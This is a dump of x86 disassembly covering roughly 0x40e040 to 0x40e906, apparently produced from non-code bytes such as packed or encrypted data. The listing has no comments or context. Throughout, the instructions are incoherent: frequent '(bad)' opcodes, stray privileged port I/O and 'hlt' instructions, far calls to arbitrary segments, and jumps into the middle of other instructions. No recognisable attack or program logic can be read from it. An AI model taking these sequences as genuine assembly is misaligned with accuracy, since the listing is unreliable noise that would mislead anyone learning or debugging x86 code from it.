  40e040:	add    DWORD PTR [edi-0x138f750b],edx
  40e046:	enter  0x37e0,0xc4
  40e04a:	loopne 0x40e02c
  40e04c:	xchg   bh,ah
  40e04e:	test   BYTE PTR [ecx+0x7d8347e0],0x69
  40e055:	call   0xad41:0xd28cfc7c
  40e05c:	pop    es
  40e05d:	pop    esi
  40e05e:	into   
  40e05f:	inc    esp
  40e060:	sub    al,0x2e
  40e062:	or     al,BYTE PTR [eax]
  40e064:	mov    WORD PTR [eax-0x4fa31fc0],gs
  40e06a:	inc    eax
  40e06b:	hlt    
  40e06c:	pop    esp
  40e06d:	sti    
  40e06e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e06f:	je     0x40dff5
  40e071:	test   DWORD PTR [esi-0xd891406],edx
  40e077:	mov    edi,0x7c8b3158
  40e07c:	loopne 0x40e0ab
  40e07e:	ds push es
  40e080:	movups XMMWORD PTR [edx-0x74b0bf01],xmm5
  40e087:	jl     0x40e035
  40e089:	sub    eax,0xa0bb083e
  40e08e:	test   eax,0xa3cb09e7
  40e093:	(bad)  
  40e094:	stos   DWORD PTR es:[edi],eax
  40e095:	rcr    al,0xe7
  40e098:	jbe    0x40e0d9
  40e09a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e09b:	inc    BYTE PTR [eax]
	...
  40e0ad:	add    BYTE PTR [eax],al
  40e0af:	add    BYTE PTR [ebx+0x19e7b8c0],bl
  40e0b5:	retf   0xfea3
  40e0b8:	mov    bh,0xed
  40e0ba:	inc    esi
  40e0bb:	pop    edi
  40e0bc:	push   ebp
  40e0bd:	jmp    0x40e0c7
  40e0bf:	add    BYTE PTR [edi],al
  40e0c1:	jo     0x40e06f
  40e0c3:	stos   BYTE PTR es:[edi],al
  40e0c4:	jae    0x40e126
  40e0c6:	mov    al,ds:0xd11e982
  40e0cb:	je     0x40e057
  40e0cd:	stos   BYTE PTR es:[edi],al
  40e0ce:	and    eax,0x98808cf4
  40e0d3:	mov    cl,cl
  40e0d5:	and    DWORD PTR [ebp+0xca66874],esp
  40e0db:	(bad)  
  40e0dc:	mov    ecx,0xaf4994a1
  40e0e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0e2:	mov    ds:0xdf948db7,eax
  40e0e7:	add    ecx,DWORD PTR [esi+esi*4-0x77b2454a]
  40e0ee:	fist   WORD PTR [esi+0x7]
  40e0f1:	sub    BYTE PTR [ebx-0x38],ah
  40e0f4:	dec    ebx
  40e0f5:	mov    edi,0x949c2f62
  40e0fa:	mov    esp,0xdf953bf9
  40e0ff:	add    ecx,DWORD PTR [edi+esi*4-0x6b603dd8]
  40e106:	cs aas 
  40e108:	jl     0x40e175
  40e10a:	xor    DWORD PTR [ecx+0x48],edi
  40e10d:	test   BYTE PTR [esi],dl
  40e10f:	out    0xff,eax
  40e111:	add    eax,0x3a1
	...
  40e126:	add    BYTE PTR [eax],al
  40e128:	add    eax,0x8c19efd1
  40e12d:	pop    ss
  40e12e:	jge    0x40e0e3
  40e130:	ret    0xe7a0
  40e133:	fwait
  40e134:	call   0xeedc7f2
  40e139:	cdq    
  40e13a:	out    dx,eax
  40e13b:	add    esp,DWORD PTR [ecx]
  40e13d:	mov    BYTE PTR [ecx+0x3],bl
  40e140:	ss mov al,0xde
  40e143:	test   BYTE PTR ss:[ebx+edi*2],ch
  40e147:	dec    ecx
  40e148:	xchg   ebx,eax
  40e149:	push   ss
  40e14a:	iret   
  40e14b:	mov    al,ss:0x6bfc3d15
  40e151:	and    ebx,DWORD PTR ds:0x2d0c7aad
  40e157:	mov    al,0x72
  40e159:	mov    al,ds:0x8ce0acf3
  40e15e:	xchg   edi,eax
  40e15f:	je     0x40e121
  40e161:	adc    eax,0x80e0ac9f
  40e166:	xchg   BYTE PTR [esi],dh
  40e168:	test   BYTE PTR [esp+ebx*2],ch
  40e16b:	dec    esi
  40e16c:	dec    ebx
  40e16d:	push   ss
  40e16e:	jns    0x40e1b6
  40e170:	inc    esp
  40e171:	push   ss
  40e172:	or     esp,edi
  40e174:	mov    ds:0x17e17c15,eax
  40e179:	clc    
  40e17a:	push   ebx
  40e17b:	data16 clc 
  40e17d:	push   ss
  40e17e:	jl     0x40e175
  40e180:	lock mov al,ds:0xb94f4100
  40e186:	cmc    
  40e187:	dec    esi
  40e188:	xchg   esp,eax
  40e189:	rcr    BYTE PTR [edx+ebp*2],1
	...
  40e1a0:	not    DWORD PTR ds:0x990ced7a
  40e1a6:	hlt    
  40e1a7:	in     al,0xc3
  40e1a9:	xchg   DWORD PTR [ecx+0x7c9123ac],ecx
  40e1af:	out    dx,al
  40e1b0:	(bad)  
  40e1b1:	aad    0x55
  40e1b3:	xor    ch,cl
  40e1b5:	or     DWORD PTR [eax],0x48080348
  40e1bb:	jmp    0xac710f7e
  40e1c0:	neg    DWORD PTR [edi-0x49302df3]
  40e1c6:	mov    edi,0x8994a32b
  40e1cb:	ins    BYTE PTR es:[edi],dx
  40e1cc:	jecxz  0x40e15e
  40e1ce:	jnp    0x40e1c7
  40e1d0:	mul    BYTE PTR [eax-0x73a221e4]
  40e1d6:	loopne 0x40e1d9
  40e1d8:	inc    ebp
  40e1d9:	adc    eax,0x4c4d60f6
  40e1de:	popa   
  40e1df:	jmp    0xd1497573
  40e1e4:	push   cs
  40e1e5:	mov    bl,0xf5
  40e1e7:	mov    dh,0xf9
  40e1e9:	sar    ah,1
  40e1eb:	add    ah,BYTE PTR [edi]
  40e1ed:	sub    bl,BYTE PTR [ebx]
  40e1ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1f0:	popf   
  40e1f1:	xor    ch,0x14
  40e1f4:	pusha  
  40e1f5:	sub    eax,0x1627343c
  40e1fa:	xor    BYTE PTR [esp+ebx*1],0xc
  40e1fe:	or     eax,0x31d1cf00
  40e203:	jge    0x40e205
	...
  40e215:	add    BYTE PTR [eax],al
  40e217:	add    BYTE PTR ds:0x688bdf5e,cl
  40e21d:	test   BYTE PTR [ecx+0x5642538],cl
  40e223:	dec    DWORD PTR [eax-0x1b]
  40e226:	in     eax,dx
  40e227:	inc    ecx
  40e228:	push   edi
  40e229:	jmp    0xc2bf:0xc9652bf6
  40e230:	sbb    DWORD PTR [ecx-0x6cae8277],edx
  40e236:	add    eax,0x8900a85
  40e23b:	add    BYTE PTR [esi+0x6e6ee2e9],cl
  40e241:	ret    
  40e242:	cld    
  40e243:	mov    edi,ecx
  40e245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e246:	or     al,BYTE PTR [ebp-0x7b]
  40e249:	jbe    0x40e253
  40e24b:	push   eax
  40e24c:	and    BYTE PTR [ebx+0x0],0xe8
  40e250:	ds (bad) 
  40e252:	cmc    
  40e253:	call   DWORD PTR [edx+0x38ff1c63]
  40e259:	sbb    esi,ebp
  40e25b:	mov    ecx,0x89f6ea21
  40e260:	call   0xb2414241
  40e265:	arpl   WORD PTR [edi+edi*8],bx
  40e268:	cmp    BYTE PTR [eax],bl
  40e26a:	out    dx,al
  40e26b:	dec    ecx
  40e26c:	mov    ebp,0x708bf6e9
  40e271:	test   BYTE PTR [ecx+0x5c57539],cl
  40e277:	(bad)  
  40e278:	mov    eax,0xedee44
	...
  40e28d:	add    BYTE PTR [eax],al
  40e28f:	add    ah,al
  40e291:	aas    
  40e292:	imul   DWORD PTR [ebx]
  40e294:	and    eax,0x69c2bf5f
  40e299:	cwde   
  40e29a:	cmc    
  40e29b:	jne    0x40e22a
  40e29d:	aas    
  40e29e:	jge    0x40e2b4
  40e2a0:	mov    WORD PTR [edx],gs
  40e2a2:	cmp    esp,ecx
  40e2a4:	push   ebx
  40e2a5:	test   eax,0x5c1fef0
  40e2aa:	xchg   edx,eax
  40e2ab:	xchg   edx,eax
  40e2ac:	inc    edx
  40e2ad:	xchg   ebx,eax
  40e2ae:	mov    ds:0xf3114c0a,al
  40e2b3:	(bad)  
  40e2b4:	mov    ecx,0xadc59189
  40e2b9:	jp     0x40e25d
  40e2bb:	sub    cl,BYTE PTR [ebx+edx*2-0x4b]
  40e2bf:	rol    DWORD PTR [eax-0x6ec4b503],0x65
  40e2c6:	cmp    ecx,DWORD PTR [ebp-0xfdaef5]
  40e2cc:	jns    0x40e2b7
  40e2ce:	mov    ds:0x38cac474,al
  40e2d3:	or     al,0xf3
  40e2d5:	dec    eax
  40e2d6:	repnz out 0x72,eax
  40e2d9:	mov    ebx,0xbd97fea2
  40e2de:	repnz test BYTE PTR [esi],bh
  40e2e1:	cld    
  40e2e2:	or     DWORD PTR [eax],eax
  40e2e4:	shr    DWORD PTR [eax],cl
  40e2e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2e7:	out    0x21,eax
  40e2e9:	sbb    eax,0xbd77fea3
  40e2ee:	inc    edx
  40e2ef:	leave  
  40e2f0:	into   
  40e2f1:	icebp  
  40e2f2:	or     ecx,ebp
	...
  40e308:	jb     0x40e306
  40e30a:	or     DWORD PTR [eax],eax
  40e30c:	vmwrite esp,DWORD PTR [eax-0x7876cf4]
  40e313:	add    BYTE PTR [ebp+edi*8-0x665a012c],cl
  40e31a:	or     DWORD PTR [eax],eax
  40e31c:	mov    WORD PTR [esi-0x6e80bbb],es
  40e322:	arpl   WORD PTR [edx],ax
  40e324:	ror    DWORD PTR [ebp+0x17],1
  40e327:	add    ah,bl
  40e329:	inc    edx
  40e32a:	or     BYTE PTR es:[esp+edx*4-0x1a],dh
  40e32f:	dec    edx
  40e330:	arpl   WORD PTR [ebx],dx
  40e332:	sbb    al,BYTE PTR [ebx+ebx*2]
  40e335:	mov    ebx,esi
  40e337:	test   al,0xd8
  40e339:	pushf  
  40e33a:	xchg   DWORD PTR [ebp+0x42],esp
  40e33d:	adc    ecx,DWORD PTR [edi+0x62a8d07d]
  40e343:	jmp    0x40e380
  40e345:	mov    dh,ch
  40e347:	test   al,0xb8
  40e349:	or     BYTE PTR [eax+0x6f13ad41],cl
  40e34f:	fucom  st(3)
  40e351:	jb     0x40e38b
  40e353:	(bad)  
  40e354:	jg     0x40e2ea
  40e356:	jmp    0xb98:0x48999fd5
  40e35d:	adc    esp,eax
  40e35f:	jp     0x40e3a9
  40e361:	add    dl,bl
  40e363:	add    edi,ebx
  40e365:	mov    bl,dl
  40e367:	test   al,0x78
  40e369:	pushf  
  40e36a:	inc    edi
  40e36b:	xor    eax,0x0
	...
  40e380:	jecxz  0x40e394
  40e382:	das    
  40e383:	jge    0x40e3d5
  40e385:	test   al,0x62
  40e387:	jmp    0x40e364
  40e389:	xchg   esi,ebp
  40e38b:	test   al,0x58
  40e38d:	or     BYTE PTR [eax],cl
  40e38f:	adc    DWORD PTR ds:0x3dd0f13,ebp
  40e395:	jae    0x40e3cf
  40e397:	(bad)  
  40e398:	lahf   
  40e399:	xchg   esp,eax
  40e39a:	(bad)  
  40e39b:	out    dx,al
  40e39c:	pop    ds
  40e39d:	and    ah,BYTE PTR [ecx-0x28a6e4fd]
  40e3a3:	jl     0x40e3ed
  40e3a5:	cld    
  40e3a6:	bound  ebx,QWORD PTR [ebx-0x1402a79]
  40e3ac:	data16 out 0x98,al
  40e3af:	test   al,0x8b
  40e3b1:	adc    ah,al
  40e3b3:	mov    al,0x7c
  40e3b5:	push   ss
  40e3b6:	fcom   DWORD PTR [eax]
  40e3b8:	add    eax,0x8c90858
  40e3bd:	and    eax,0xe458e90a
  40e3c3:	loop   0x40e367
  40e3c5:	cld    
  40e3c6:	jge    0x40e3b3
  40e3c8:	clc    
  40e3c9:	mov    esp,0x58d0bb21
  40e3ce:	in     al,0xc2
  40e3d0:	mov    dh,ah
  40e3d2:	xor    DWORD PTR [eax+eiz*1],0x10cac817
  40e3d9:	std    
  40e3da:	or     al,0x7e
  40e3dc:	(bad)  
  40e3dd:	xchg   esi,eax
  40e3de:	pop    ebx
  40e3df:	mov    DWORD PTR [esi+0x72ec68],esp
	...
  40e3f5:	add    BYTE PTR [eax],al
  40e3f7:	add    BYTE PTR [edx-0x4],ah
  40e3fa:	xor    DWORD PTR [ebx+edi*8+0x52620b86],esp
  40e401:	hlt    
  40e402:	loope  0x40e3ee
  40e404:	mov    BYTE PTR [eax-0x14],bl
  40e407:	inc    esi
  40e408:	mov    dl,0xa8
  40e40a:	cmc    
  40e40b:	mov    ah,0x23
  40e40d:	(bad)  
  40e40e:	cmc    
  40e40f:	mov    esp,0x36a7f9f7
  40e414:	xor    al,0x13
  40e416:	add    ch,BYTE PTR [ecx]
  40e418:	mov    dl,0xa1
  40e41a:	cmc    
  40e41b:	xchg   esp,eax
  40e41c:	sub    edi,edx
  40e41e:	xchg   ebx,eax
  40e41f:	mov    DWORD PTR [ebx+edx*1],esp
  40e422:	and    ch,BYTE PTR [ecx]
  40e424:	push   esp
  40e425:	fcmovne st,st(2)
  40e427:	fisttp QWORD PTR [edi+0x381d4c1b]
  40e42d:	loope  0x40e3b2
  40e42f:	lods   al,BYTE PTR ds:[esi]
  40e430:	ret    
  40e431:	popa   
  40e432:	and    DWORD PTR [edi+edx*8+0x16d15a61],0xf
  40e43a:	neg    dh
  40e43c:	sbb    DWORD PTR [eax-0x28],ebx
  40e43f:	(bad)  
  40e440:	pop    ebp
  40e441:	lock loopne 0x40e41a
  40e444:	fist   DWORD PTR [ecx]
  40e446:	test   BYTE PTR [eax],0xf6
  40e449:	mov    ebx,0x9bc100d8
  40e44e:	mov    DWORD PTR [ebp+0x1d],edi
  40e451:	cwde   
  40e452:	jl     0x40e46b
  40e454:	cmp    al,bl
  40e456:	fdiv   st(7),st
  40e458:	and    al,0xf6
  40e45b:	jne    0x40e45d
	...
  40e46d:	add    BYTE PTR [eax],al
  40e46f:	add    BYTE PTR [ecx+0x3a],ch
  40e472:	jge    0x40e47c
  40e474:	cli    
  40e475:	bound  edx,QWORD PTR [eax]
  40e477:	jmp    DWORD PTR [eax+0xe02ede0]
  40e47d:	cmp    edi,esi
  40e47f:	inc    edi
  40e480:	dec    esi
  40e481:	mov    esp,0xe5a70ff0
  40e486:	repz (bad) 
  40e488:	mov    edx,0xbdf47d39
  40e48d:	push   ebp
  40e48e:	push   0x880baff
  40e493:	add    BYTE PTR ds:0xb7c95595,ah
  40e499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e49a:	or     BYTE PTR [ebp+0x7e],dl
  40e49d:	sub    al,0x5f
  40e49f:	inc    DWORD PTR [eax+0xd]
  40e4a2:	out    dx,al
  40e4a3:	ror    bl,cl
  40e4a5:	cmp    edi,esi
  40e4a7:	push   0x47b4bb
  40e4ac:	stos   BYTE PTR es:[edi],al
  40e4ad:	ret    
  40e4ae:	add    al,ch
  40e4b0:	popa   
  40e4b1:	int3   
  40e4b2:	or     BYTE PTR [eax],al
  40e4b4:	out    dx,al
  40e4b5:	aam    0x7c
  40e4b7:	add    eax,0x8c84ffa
  40e4bc:	mov    ch,0x4e
  40e4be:	idiv   bh
  40e4c0:	mov    edx,0x74e800c3
  40e4c5:	stos   BYTE PTR es:[edi],al
  40e4c6:	cmc    
  40e4c7:	(bad)  
  40e4c8:	jp     0x40e462
  40e4ca:	imul   eax,DWORD PTR [ecx-0x4b],0x39
  40e4ce:	jge    0x40e4d8
  40e4d0:	bound  esi,QWORD PTR [eax]
  40e4d2:	jl     0x40e51f
	...
  40e4e8:	mov    ebx,?
  40e4ea:	or     DWORD PTR [ebx],ecx
  40e4ec:	dec    esp
  40e4ed:	imul   eax,DWORD PTR [edi],0xf23c555f
  40e4f3:	push   DWORD PTR [edi+0xb]
  40e4f6:	retf   0x73b8
  40e4f9:	inc    edi
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	(bad)  
  40e4fc:	pop    esi
  40e4fd:	nop
  40e4fe:	loope  0x40e506
  40e500:	fstp   DWORD PTR ds:0x258474af
  40e506:	jns    0x40e551
  40e508:	mov    ebp,?
  40e50a:	repnz mov edi,0xc94ef8c1
  40e510:	dec    esi
  40e511:	push   es
  40e512:	or     ch,BYTE PTR [eax+0x7c]
  40e515:	cwde   
  40e516:	dec    ebx
  40e517:	add    BYTE PTR [ebx],dh
  40e519:	adc    edx,esi
  40e51b:	out    0xcd,eax
  40e51d:	mov    dl,0xc
  40e51f:	add    BYTE PTR [edi+0x1b0938bd],dl
  40e525:	jmp    0x89ca7427
  40e52a:	jnp    0x40e56c
  40e52c:	mov    ebp,ss
  40e52e:	loop   0x40e594
  40e530:	dec    ebp
  40e531:	std    
  40e532:	scas   al,BYTE PTR es:[edi]
  40e533:	je     0x40e4b9
  40e535:	gs (bad) 
  40e537:	dec    edx
  40e538:	mov    ebp,?
  40e53a:	repnz mov edi,0x74aef461
  40e540:	nop
  40e541:	xchg   BYTE PTR [eax],cl
  40e543:	mov    al,ds:0x680a3d0a
  40e548:	inc    esi
  40e549:	and    BYTE PTR [ebp+0x0],cl
	...
  40e560:	retf   
  40e561:	sub    dl,dh
  40e563:	out    0x91,eax
  40e565:	inc    edx
  40e566:	or     al,BYTE PTR [eax]
  40e568:	xchg   DWORD PTR [ebp-0x6f4cf6c8],edi
  40e56e:	std    
  40e56f:	mov    ss,WORD PTR [ecx-0x73bf84a7]
  40e575:	xchg   esp,eax
  40e576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e577:	add    ecx,DWORD PTR [esp+edx*4-0x2d3abb21]
  40e57e:	out    0x3,eax
  40e580:	loope  0x40e59d
  40e582:	mov    ah,0x81
  40e584:	dec    edi
  40e585:	or     BYTE PTR [esi],dl
  40e587:	dec    ebp
  40e588:	in     al,0xa
  40e58a:	dec    esp
  40e58b:	inc    ebx
  40e58c:	mov    WORD PTR [edi],cs
  40e58e:	xor    eax,0x2af173fc
  40e593:	add    al,0x8c
  40e595:	fwait
  40e596:	lahf   
  40e597:	das    
  40e598:	xchg   edx,eax
  40e599:	outs   dx,DWORD PTR ds:[esi]
  40e59a:	xor    eax,0xdf984dbb
  40e59f:	inc    ebx
  40e5a0:	pop    ss
  40e5a1:	add    al,0x6b
  40e5a3:	daa    
  40e5a4:	xchg   esp,eax
  40e5a5:	sti    
  40e5a6:	loopne 0x40e607
  40e5a8:	mov    ebx,0x362edfce
  40e5ad:	cmp    BYTE PTR [eax],cl
  40e5af:	test   al,0xaf
  40e5b1:	push   ebp
  40e5b2:	fbld   TBYTE PTR [eax+ebx*4-0x3992a864]
  40e5b9:	xchg   esp,eax
  40e5ba:	(bad)  
  40e5bc:	ror    DWORD PTR [eax-0x2295bb1b],cl
  40e5c2:	and    DWORD PTR [eax],eax
	...
  40e5d8:	mov    WORD PTR [ebx],ds
  40e5da:	int    0xfb
  40e5dc:	out    0xb1,al
  40e5de:	pop    edi
  40e5df:	in     eax,0x84
  40e5e1:	mov    al,bl
  40e5e3:	sub    DWORD PTR [edx+0xc0fbba1],0xffffffcf
  40e5ea:	stc    
  40e5eb:	das    
  40e5ec:	mov    edx,DWORD PTR [edi+edx*8]
  40e5ef:	dec    eax
  40e5f0:	pop    eax
  40e5f1:	call   0x83ec:0x8868e55f
  40e5f8:	xor    BYTE PTR [esp+esi*2+0x0],0xd2
  40e5fd:	xchg   esi,eax
  40e5fe:	mov    edi,0x8cf0c3c
  40e603:	jmp    0xa50ed382
  40e608:	jmp    0x40e618
  40e60a:	imul   cl
  40e60c:	(bad)  
  40e60d:	xlat   BYTE PTR ds:[ebx]
  40e60e:	dec    ebx
  40e60f:	loope  0x40e5a0
  40e611:	xchg   esp,eax
  40e612:	or     cl,ch
  40e614:	add    al,0x91
  40e616:	add    dl,al
  40e618:	les    edx,FWORD PTR [esi+esi*1]
  40e61b:	push   cs
  40e61c:	stos   DWORD PTR es:[edi],eax
  40e61d:	mov    ecx,0xe243c89
  40e622:	jge    0x40e5ff
  40e624:	cmp    BYTE PTR [ecx-0x10],bl
  40e627:	call   0x1c497abb
  40e62c:	test   ch,dl
  40e62e:	dec    ebx
  40e62f:	popf   
  40e630:	mov    ss,WORD PTR [eax+ecx*1-0x25cdb17]
  40e637:	and    al,0xf0
  40e639:	xchg   esp,eax
  40e63a:	or     cl,ch
	...
  40e650:	pop    DWORD PTR [edi-0x51cf58fe]
  40e656:	int    0x2c
  40e658:	hlt    
  40e659:	or     eax,0x148fe9f6
  40e65e:	lds    ebp,FWORD PTR ss:[edx-0x69]
  40e662:	cmc    
  40e663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e664:	out    0xfa,eax
  40e666:	or     eax,0x90cca2e
  40e66b:	jmp    0xc4ca7aff
  40e670:	xor    edx,DWORD PTR [ebp-0x68ce1585]
  40e676:	sub    BYTE PTR [esi-0x4bf730f1],ch
  40e67c:	pop    edi
  40e67d:	sbb    dh,BYTE PTR [ecx+esi*8-0xc]
  40e681:	test   eax,0x88efde88
  40e686:	push   ds
  40e687:	imul   esi,DWORD PTR [eax-0x6d],0x659f9428
  40e68e:	loope  0x40e690
  40e690:	stos   DWORD PTR es:[edi],eax
  40e691:	mov    ecx,DWORD PTR [esi+0x1]
  40e694:	cmp    eax,0xe2804f10
  40e699:	xchg   ecx,eax
  40e69a:	jnp    0x40e691
  40e69c:	adc    cl,cl
  40e69e:	dec    ebp
  40e69f:	xor    BYTE PTR [edx-0x68],0x7b
  40e6a3:	fucomip st,st(2)
  40e6a5:	pop    ebx
  40e6a6:	cld    
  40e6a7:	add    BYTE PTR [ebp-0x6f],dh
  40e6aa:	or     BYTE PTR [ebx+0x7d81a0d8],cl
  40e6b0:	jge    0x40e6f0
  40e6b2:	sub    BYTE PTR [eax+0x0],al
	...
  40e6c8:	jb     0x40e6c7
  40e6ca:	jl     0x40e6e8
  40e6cc:	cmp    ebx,DWORD PTR [ecx+0x2c98ff08]
  40e6d2:	pop    esp
  40e6d3:	call   0x381a16
  40e6d8:	pop    esi
  40e6d9:	sar    DWORD PTR [esi+eax*1-0x7e],1
  40e6dd:	push   edx
  40e6de:	mov    edi,0x819129c2
  40e6e3:	imul   DWORD PTR [ebx+0x31]
  40e6e6:	dec    ebp
  40e6e7:	hlt    
  40e6e8:	push   0x18
  40e6ea:	aaa    
  40e6eb:	add    BYTE PTR [eax],ch
  40e6ed:	push   eax
  40e6ee:	div    DWORD PTR [ebp-0x67]
  40e6f1:	retf   0xce0
  40e6f4:	mov    bl,0x31
  40e6f6:	neg    DWORD PTR [edi-0x2d]
  40e6f9:	ffreep st(7)
  40e6fb:	add    al,0xf5
  40e6fd:	retf   
  40e6fe:	sub    esp,0x56cddc76
  40e704:	sbb    dl,BYTE PTR [esi]
  40e706:	jne    0x40e71c
  40e708:	in     eax,0xa4
  40e70a:	inc    DWORD PTR [edx+0x414266e0]
  40e710:	cmc    
  40e711:	nop
  40e712:	jnp    0x40e71a
  40e714:	rcl    BYTE PTR [edx-0x41],cl
  40e717:	ret    0x90d5
  40e71a:	add    DWORD PTR [ebp-0x74],0x2004d50f
  40e721:	ins    DWORD PTR es:[edi],dx
  40e722:	dec    ebx
  40e723:	add    BYTE PTR [ebx-0x73ff9286],cl
  40e729:	sti    
  40e72a:	aam    0x4
	...
  40e740:	in     al,dx
  40e741:	je     0x40e78e
  40e743:	add    BYTE PTR [ebx-0x73ff8e86],dl
  40e749:	sti    
  40e74a:	aam    0x4
  40e74c:	call   0x9b4133cd
  40e751:	jle    0x40e6d9
  40e753:	add    BYTE PTR [ebp+edi*8-0x517fbb68],cl
  40e75a:	xchg   edi,eax
  40e75b:	inc    esp
  40e75c:	je     0x40e70c
  40e75e:	xchg   edi,eax
  40e75f:	inc    esp
  40e760:	push   0x34a9ae
  40e765:	ins    BYTE PTR es:[edi],dx
  40e766:	dec    esp
  40e767:	add    BYTE PTR [ebx-0x57],bl
  40e76a:	cld    
  40e76b:	out    0x12,eax
  40e76d:	ss stos DWORD PTR es:[edi],eax
  40e76f:	(bad)  
  40e770:	sbb    DWORD PTR [ecx-0x4eeeb05c],edi
  40e776:	mov    eax,0x9cb9094f
  40e77b:	dec    edi
  40e77c:	xor    eax,DWORD PTR [ecx+0x6e]
  40e77f:	(bad)  
  40e780:	int    0xfd
  40e782:	stos   BYTE PTR es:[edi],al
  40e783:	je     0x40e801
  40e785:	adc    eax,0x731bf76e
  40e78a:	cwde   
  40e78b:	inc    esp
  40e78c:	xor    BYTE PTR [esi-0x67],cl
  40e78f:	inc    esp
  40e790:	in     al,dx
  40e791:	dec    ebp
  40e792:	cdq    
  40e793:	inc    esp
  40e794:	call   0x2c7592e6
  40e799:	test   BYTE PTR [eax+eax*1-0xd],cl
  40e79d:	inc    eax
  40e79e:	cli    
  40e79f:	out    0x16,eax
  40e7a1:	(bad)  
  40e7a2:	stos   BYTE PTR es:[edi],al
  40e7a3:	inc    BYTE PTR [eax]
	...
  40e7b5:	add    BYTE PTR [eax],al
  40e7b7:	add    bl,ah
  40e7b9:	inc    eax
  40e7ba:	scas   al,BYTE PTR es:[edi]
  40e7bb:	mov    ss,WORD PTR [ecx-0x6c]
  40e7be:	xor    esp,DWORD PTR [edx+0x4866e858]
  40e7c4:	in     al,0xd3
  40e7c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7c7:	mov    bl,0xc3
  40e7c9:	or     esp,eax
  40e7cb:	add    ecx,DWORD PTR [ecx]
  40e7cd:	push   edx
  40e7ce:	cmp    esi,DWORD PTR [ebx]
  40e7d0:	es xchg ebp,eax
  40e7d2:	cdq    
  40e7d3:	add    esi,DWORD PTR [esi]
  40e7d5:	xchg   esp,eax
  40e7d6:	mov    DWORD PTR [ebx],eax
  40e7d8:	ss xchg esp,eax
  40e7da:	push   esp
  40e7db:	dec    eax
  40e7dc:	shl    BYTE PTR [esi+ebp*8-0x9],0xdd
  40e7e1:	pop    edi
  40e7e2:	and    BYTE PTR [edi+edx*4],al
  40e7e5:	aam    0xee
  40e7e7:	xchg   DWORD PTR [ebp+0xf03df95],edx
  40e7ed:	mov    DWORD PTR [edi-0x1fef7cfc],ecx
  40e7f3:	add    cl,BYTE PTR [esp+edx*4-0x30afb096]
  40e7fa:	adc    al,0xa8
  40e7fc:	mov    dl,BYTE PTR [ebx]
  40e7fe:	xchg   esp,eax
  40e7ff:	add    al,0x8c
  40e801:	xchg   esp,eax
  40e802:	xchg   ebx,eax
  40e803:	(bad)  
  40e804:	shl    ah,0x6a
  40e807:	pop    ds
  40e808:	pusha  
  40e809:	pop    ds
  40e80a:	adc    eax,0x72962ed0
  40e80f:	push   0x91a38132
  40e814:	shl    al,1
  40e816:	jle    0x40e82f
  40e818:	cmp    al,0xfc
  40e81a:	scas   eax,DWORD PTR es:[edi]
  40e81b:	dec    ebx
	...
  40e830:	mov    WORD PTR [edx+eiz*2-0x196befe1],ss
  40e837:	xchg   ecx,ebx
  40e839:	xchg   ebx,eax
  40e83a:	fild   WORD PTR [ebx]
  40e83c:	jns    0x10cbec91
  40e842:	and    al,0x4
  40e844:	mov    WORD PTR [edx+eiz*2+0x893f01f],ss
  40e84b:	out    0xb,al
  40e84d:	dec    ebp
  40e84e:	or     ecx,ebp
  40e850:	(bad)  
  40e851:	or     edi,DWORD PTR [ebp+eiz*1+0x20]
  40e855:	int3   
  40e856:	push   ebx
  40e857:	push   ds
  40e858:	in     eax,dx
  40e859:	sbb    ecx,DWORD PTR [ecx+eiz*1-0x13]
  40e85d:	jg     0x40e853
  40e85f:	push   cs
  40e860:	mov    ds:0x1b7cf5dc,eax
  40e865:	repz push ebp
  40e867:	pushf  
  40e868:	in     al,dx
  40e869:	or     DWORD PTR [ecx-0x70],esp
  40e86c:	push   0x55
  40e86e:	or     BYTE PTR [ecx],al
  40e870:	fist   DWORD PTR [ecx+0x8]
  40e873:	jmp    0x449064d7
  40e878:	iret   
  40e879:	xchg   esp,eax
  40e87a:	cmc    
  40e87b:	pop    esp
  40e87c:	push   eax
  40e87d:	repnz mov esp,DWORD PTR [eax]
  40e880:	nop
  40e881:	xchg   esp,eax
  40e882:	add    DWORD PTR [ecx+0x4960ac9b],ebp
  40e888:	mov    bl,0x53
  40e88a:	or     cl,al
  40e88c:	dec    esi
  40e88d:	push   ebx
  40e88e:	or     cl,ch
  40e890:	lahf   
  40e891:	jl     0x40e8fb
  40e893:	or     al,0x0
	...
  40e8a5:	add    BYTE PTR [eax],al
  40e8a7:	add    bh,cl
  40e8a9:	xchg   esp,eax
  40e8aa:	cmc    
  40e8ab:	adc    al,0x58
  40e8ad:	repnz pop edi
  40e8af:	and    BYTE PTR [eax-0x5c56fe6c],cl
  40e8b5:	lods   al,BYTE PTR ds:[esi]
  40e8b6:	pusha  
  40e8b7:	adc    DWORD PTR [ebx+0x53],ebp
  40e8ba:	or     BYTE PTR [ecx-0x16f7ad4e],dl
  40e8c0:	pop    edi
  40e8c1:	jl     0x40e923
  40e8c3:	add    al,0xcf
  40e8c5:	xchg   esp,eax
  40e8c6:	cmc    
  40e8c7:	fadd   QWORD PTR [edi-0xe]
  40e8ca:	inc    ebx
  40e8cb:	mov    al,0x8f
  40e8cd:	xchg   esp,eax
  40e8ce:	add    DWORD PTR [ecx],ebp
  40e8d0:	call   0xb6f9:0x8fe9604f
  40e8d7:	add    BYTE PTR [edx-0x5e],cl
  40e8da:	add    al,0xe8
  40e8dc:	aam    0xce
  40e8de:	cmc    
  40e8df:	call   FWORD PTR [edx+0x248e9de2]
  40e8e5:	xchg   esi,eax
  40e8e6:	cmc    
  40e8e7:	jne    0x40e8c2
  40e8e9:	cmp    eax,0x34aa595b
  40e8ee:	div    DWORD PTR [ebp-0x67]
  40e8f1:	xor    al,0x7d
  40e8f3:	hlt    
  40e8f4:	mov    ah,BYTE PTR [edx-0x30f117fc]
  40e8fa:	cmc    
  40e8fb:	jmp    FWORD PTR [edx+0x20fff89f]
  40e901:	cmp    eax,0x3db975f7
  40e906:	gs pop ecx
